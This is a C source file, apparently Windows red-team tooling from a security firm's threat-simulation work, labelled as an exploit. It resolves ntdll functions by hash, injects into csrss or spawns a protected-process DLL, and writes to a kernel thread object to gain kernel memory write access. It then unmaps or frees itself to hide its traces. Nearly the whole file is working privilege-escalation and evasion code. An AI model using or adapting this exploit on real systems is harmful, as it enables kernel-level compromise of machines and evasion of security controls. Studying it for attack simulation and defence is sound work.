/*!
 *
 * Exploit
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( NtProtectVirtualMemory );
	D_API( NtWaitForSingleObject );
	D_API( NtWriteVirtualMemory );
	D_API( NtQueryVirtualMemory );
	D_API( NtUnmapViewOfSection );
	D_API( NtFreeVirtualMemory );
	D_API( RtlExitUserThread );
	D_API( RtlCaptureContext );
	D_API( CsrGetProcessId );
	D_API( NtOpenThread );
	D_API( NtContinue );
	D_API( NtClose );
} API ;

#define H_API_NTPROTECTVIRTUALMEMORY	0x50e92888 /* NtProtectVirtualMemory */
#define H_API_NTWAITFORSINGLEOBJECT	0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_NTWRITEVIRTUALMEMORY	0xc3170192 /* NtWriteVirtualMemory */
#define H_API_NTQUERYVIRTUALMEMORY	0x10c0e85d /* NtQueryVirtualMemory */
#define H_API_NTUNMAPVIEWOFSECTION	0x6aa412cd /* NtUnmapViewOfSection */
#define H_API_NTFREEVIRTUALMEMORY	0x2802c609 /* NtFreeVirtualMemory */
#define H_API_RTLEXITUSERTHREAD		0x2f6db5e8 /* RtlExitUserThread */
#define H_API_RTLCAPTURECONTEXT		0xeba8d910 /* RtlCaptureContext */
#define H_API_CSRGETPROCESSID		0x469970b9 /* CsrGetProcessId */
#define H_API_NTOPENTHREAD		0x968e0cb1 /* NtOpenThread */
#define H_API_NTCONTINUE		0xfc3a6c2c /* NtContinue */
#define H_API_NTCLOSE			0x40d6e69d /* NtClose */	
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Injects a DLL into a protected process, and
 * leverages the new elevated permissions to
 * overwrite kernel memory.
 *
!*/

D_SEC( A ) VOID WINAPI Start( VOID )
{
	API				Api;
	CONTEXT				Ctx;
	OBJECT_ATTRIBUTES		Att;
	PROCESS_INFORMATION		Pri;
	MEMORY_BASIC_INFORMATION	Mem;

	SIZE_T				Len = 0;

	ULONG				Prt = 0;
	PVOID				Img = NULL;
	PVOID				Obj = NULL;
	HANDLE				Th1 = NULL;
	PIMAGE_DOS_HEADER		Dos = NULL;
	PIMAGE_NT_HEADERS		Nth = NULL;
	PIMAGE_SECTION_HEADER		Sec = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );
	RtlSecureZeroMemory( &Pri, sizeof( Pri ) );
	RtlSecureZeroMemory( &Mem, sizeof( Mem ) );

	Dos = C_PTR( G_PTR( Start ) );

	do {
		if ( Dos->e_magic == IMAGE_DOS_SIGNATURE ) {
			if ( Dos->e_lfanew >= sizeof( IMAGE_DOS_HEADER ) ) {
				if ( Dos->e_lfanew < 1024 ) {
					Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
					if ( Nth->Signature == IMAGE_NT_SIGNATURE ) {
						break;
					};
				};
			};
		};
		Dos = C_PTR( U_PTR( Dos ) - 1 );
	} while ( TRUE );

	/* Get a pointer to our function */
	Api.NtProtectVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTPROTECTVIRTUALMEMORY );
	Api.NtWaitForSingleObject  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.NtWriteVirtualMemory   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWRITEVIRTUALMEMORY );
	Api.NtQueryVirtualMemory   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYVIRTUALMEMORY );
	Api.NtUnmapViewOfSection   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTUNMAPVIEWOFSECTION );
	Api.NtFreeVirtualMemory    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFREEVIRTUALMEMORY );
	Api.RtlExitUserThread      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLEXITUSERTHREAD );
	Api.RtlCaptureContext      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCAPTURECONTEXT );
	Api.CsrGetProcessId        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_CSRGETPROCESSID );
	Api.NtOpenThread           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENTHREAD );
	Api.NtContinue             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCONTINUE );
	Api.NtClose                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	/* Get base and sizes */
	Sec = IMAGE_FIRST_SECTION( Nth );
	Img = Dos;
	Len = Sec[ Nth->FileHeader.NumberOfSections - 1 ].PointerToRawData;
	Len = Len + Sec[ Nth->FileHeader.NumberOfSections - 1 ].SizeOfRawData;
	Len = ( ( Len + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );

	/* Change the memory protection to ensure we are writeable */
	if ( NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_EXECUTE_READWRITE, &Prt ) ) ) 
	{
		/* Store Variables For Exploit Stages */
		( ( PTABLE ) G_PTR( Table ) )->CsrssId   = Api.CsrGetProcessId( );
		( ( PTABLE ) G_PTR( Table ) )->ThreadId  = NtCurrentTeb()->ClientId.UniqueThread;
		( ( PTABLE ) G_PTR( Table ) )->ProcessId = NtCurrentTeb()->ClientId.UniqueProcess;

		/* Setting EP */
		Nth->OptionalHeader.AddressOfEntryPoint  = G_PTR( DllMain ) - G_PTR( Start );
		Nth->OptionalHeader.AddressOfEntryPoint += Sec->VirtualAddress;

		/* Set physical length of PE */
		Len = Sec[ Nth->FileHeader.NumberOfSections - 1 ].PointerToRawData;
		Len = Len + Sec[ Nth->FileHeader.NumberOfSections - 1 ].SizeOfRawData;

		if ( NtCurrentPeb()->OSBuildNumber >= 7600 ) {
			if ( NtCurrentPeb()->OSBuildNumber >= 9600 ) {
				/* Create a KnownDLLs EntryPoint */
				if ( SpawnProtectedProcessLibrary( Dos, Len, &Pri ) ) {
					if ( NT_SUCCESS( Api.NtWaitForSingleObject( Pri.hProcess, FALSE, NULL ) ) ) {
						/* Leverage R/W! */
						__debugbreak();
					};
					Api.NtClose( Pri.hThread );
					Api.NtClose( Pri.hProcess );
				};
			} else {
				if ( InjectProcess( ( ( PTABLE ) G_PTR( Table ) )->CsrssId, C_PTR( G_PTR( ExploitFunction ) ), U_PTR( G_END() ) - U_PTR( G_PTR( ExploitFunction ) ), &Th1 ) ) {
					if ( NT_SUCCESS( Api.NtWaitForSingleObject( Th1, FALSE, NULL ) ) ) {
						/* Leverage R/W! */
						__debugbreak();
					};
					Api.NtClose( Th1 );
				};
			};
			/* QOL: Cleanup whether anything above succeeds! */
			InitializeObjectAttributes( &Att, NULL, 0, NULL, NULL );
			if ( NT_SUCCESS( Api.NtOpenThread( &Th1, THREAD_ALL_ACCESS, &Att, &NtCurrentTeb()->ClientId ) ) ) {
				if ( ( Obj = KernelObjectAddress( Th1 ) ) != NULL ) { 
					if ( NtCurrentPeb()->OSBuildNumber >= 9200 ) {
						Api.NtWriteVirtualMemory( NtCurrentProcess(), C_PTR( U_PTR( Obj ) + 0x232 ), &( BYTE ){ 1 }, sizeof( BYTE ), NULL );
					} else {
						Api.NtWriteVirtualMemory( NtCurrentProcess(), C_PTR( U_PTR( Obj ) + 0x1f6 ), &( BYTE ){ 1 }, sizeof( BYTE ), NULL );
					};
				};
				Api.NtClose( Th1 );
			};
		};
Leave:
		/* Get full structure info */
		Ctx.ContextFlags = CONTEXT_FULL; Api.RtlCaptureContext( &Ctx );

		if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess( ), C_PTR( G_PTR( Start ) ), MemoryBasicInformation, &Mem, sizeof( Mem ), NULL ) ) ) {
			if ( Mem.Type == MEM_PRIVATE ) {
				Len      = 0;
				Ctx.Rsp  = ( ( Ctx.Rsp &~ ( 0x1000 - 1 ) ) - 0x1000 );
				Ctx.Rip  = U_PTR( Api.NtFreeVirtualMemory );
				Ctx.Rcx  = U_PTR( NtCurrentProcess() );
				Ctx.Rdx  = U_PTR( &Mem.AllocationBase );
				Ctx.R8   = U_PTR( &Len );
				Ctx.R9   = U_PTR( MEM_RELEASE );
				*( ULONG_PTR * )( Ctx.Rsp + 0x0 ) = U_PTR( Api.RtlExitUserThread );
			} else {
				Len      = 0;
				Ctx.Rsp  = ( ( Ctx.Rsp &~ ( 0x1000 - 1 ) ) - 0x1000 );
				Ctx.Rip  = U_PTR( Api.NtUnmapViewOfSection );
				Ctx.Rcx  = U_PTR( NtCurrentProcess() );
				Ctx.Rdx  = U_PTR( Mem.AllocationBase );
				*( ULONG_PTR * )( Ctx.Rsp + 0x0 ) = U_PTR( Api.RtlExitUserThread );
			};
		};

		/* Set full structure info */
		Ctx.ContextFlags = CONTEXT_FULL; Api.NtContinue( &Ctx, FALSE );
	};
};
